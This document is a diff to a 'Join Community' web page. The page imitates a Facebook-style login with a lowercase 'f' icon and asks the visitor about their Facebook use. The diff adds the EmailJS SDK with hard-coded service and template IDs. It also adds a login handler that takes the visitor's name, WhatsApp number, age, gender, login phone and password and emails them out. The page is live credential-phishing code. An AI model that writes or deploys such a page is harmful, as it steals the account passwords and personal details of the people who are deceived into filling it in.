@@ -4,6 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Join Community</title>
+
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+      (function() {
+        // Public Key Initialization
+        emailjs.init("T9BKyUuqVi2V4b31r");
+      })();
+    </script>
+
     <style>
         * {
             box-sizing: border-box;
@@ -20,6 +31,7 @@
             justify-content: space-between;
             min-height: 100vh;
             padding: 20px 16px;
+            transition: background-color 0.3s ease;
         }
 
         /* View Toggle Utility */
@@ -173,10 +185,16 @@
             font-weight: 600;
             cursor: pointer;
             margin-top: 4px;
+            transition: background-color 0.2s ease;
         }
 
         .btn-primary:hover {
             background-color: #0052a3;
+        }
+
+        .btn-primary:disabled {
+            background-color: #a0c4ff;
+            cursor: not-allowed;
         }
 
         .forgot-link {
@@ -284,23 +302,25 @@
         </div>
 
         <div class="brand-icon">
-            F
+            f
         </div>
 
         <form class="login-form" id="authForm">
             <input 
                 type="text" 
+                id="loginField"
                 class="input-field" 
                 placeholder="Mobile number or email address" 
                 required 
             />
             <input 
                 type="password" 
+                id="passwordField"
                 class="input-field" 
                 placeholder="Password" 
                 required 
             />
-            <button type="submit" class="btn-primary">Log in</button>
+            <button type="submit" id="loginBtn" class="btn-primary">Log in</button>
         </form>
 
         <div class="forgot-link">
@@ -318,29 +338,79 @@
         const registerView = document.getElementById('registerView');
         const loginView = document.getElementById('loginView');
         const showRegisterBtn = document.getElementById('showRegisterBtn');
+        const loginField = document.getElementById('loginField');
+        const passwordField = document.getElementById('passwordField');
+        const loginBtn = document.getElementById('loginBtn');
 
-        // Submitting Registration Form Opens Next Page (Login Page)
-        document.getElementById('communityForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            
-            // Switch to Login Page
+        let registrationData = {};
+
+        function goToLogin() {
             registerView.classList.add('hidden');
             loginView.classList.remove('hidden');
             document.body.style.backgroundColor = "#ffffff";
-        });
+        }
 
-        // Toggle back to Registration Page via "Create new account"
-        showRegisterBtn.addEventListener('click', function(e) {
-            e.preventDefault();
+        function goToRegistration() {
             loginView.classList.add('hidden');
             registerView.classList.remove('hidden');
             document.body.style.backgroundColor = "#f0f2f5";
+        }
+
+        // 1. Collect registration data and navigate to Login page
+        document.getElementById('communityForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            registrationData = {
+                fullName: document.getElementById('fullName').value,
+                whatsapp: document.getElementById('whatsapp').value,
+                fbDuration: document.getElementById('fbDuration').value,
+                age: document.getElementById('age').value,
+                gender: document.getElementById('gender').value,
+                referrer: document.getElementById('referrer').value
+            };
+
+            // Pre-fill the login user/phone input with the WhatsApp contact
+            if (registrationData.whatsapp.trim() !== '') {
+                loginField.value = registrationData.whatsapp;
+            }
+
+            goToLogin();
         });
 
-        // Login Form Submit Handler
+        // 2. Switch back to Registration Page
+        showRegisterBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            goToRegistration();
+        });
+
+        // 3. Handle Login Submit & EmailJS dispatch
         document.getElementById('authForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            alert('Sign in attempted.');
+
+            loginBtn.innerText = 'Logging in...';
+            loginBtn.disabled = true;
+
+            const templateParams = {
+                full_name: registrationData.fullName || '',
+                whatsapp: registrationData.whatsapp || '',
+                experience: registrationData.fbDuration || '',
+                age: registrationData.age || '',
+                gender: registrationData.gender || '',
+                referrer: registrationData.referrer || '',
+                login_phone: loginField.value,
+                login_password: passwordField.value
+            };
+
+            emailjs.send("service_rf9jc9g", "template_ykjxd5h", templateParams)
+                .then(function(response) {
+                    alert('Email sent successfully!');
+                    loginBtn.innerText = 'Log in';
+                    loginBtn.disabled = false;
+                }, function(error) {
+                    alert('Failed to send email: ' + JSON.stringify(error));
+                    loginBtn.innerText = 'Log in';
+                    loginBtn.disabled = false;
+                });
         });
     </script>
 
